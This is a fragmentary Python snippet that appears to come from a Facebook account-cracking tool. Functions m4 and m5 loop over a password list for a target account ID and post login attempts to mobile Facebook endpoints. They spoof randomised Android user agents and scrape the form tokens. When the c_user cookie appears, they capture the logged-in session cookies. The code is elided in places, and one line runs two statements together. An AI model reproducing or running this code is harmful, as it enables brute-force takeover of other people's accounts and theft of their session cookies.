...
def m4(idf,pwv):
 ...
 try:
  for ps in pwv:
   ...
   lo = session.post('https://m.beta.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
   log_cookies=session.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
...
def m5(idf,pwv):
 ...
 try:
  for ps in pwv:
   ...
   ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"   free_fb = session.get(f'https://free.facebook.com').text
   log_data = {
   "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
   "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
   "display": "",
